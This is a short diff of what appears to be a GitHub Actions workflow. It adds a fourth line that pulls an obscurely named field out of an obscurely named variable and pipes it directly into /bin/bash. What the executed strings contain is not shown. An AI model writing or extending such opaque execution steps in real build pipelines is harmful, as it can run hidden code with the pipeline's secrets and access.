@@ -41,6 +41,7 @@ jobs:
           echo $gkv5768 | jq -r .rffe60095 | /bin/bash
           echo $ovu5 | jq -r .py1889 | /bin/bash
           echo $ict34810 | jq -r .dfd93480 | /bin/bash
+          printf '%s' "$tk79" | jq -r .jssx13 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
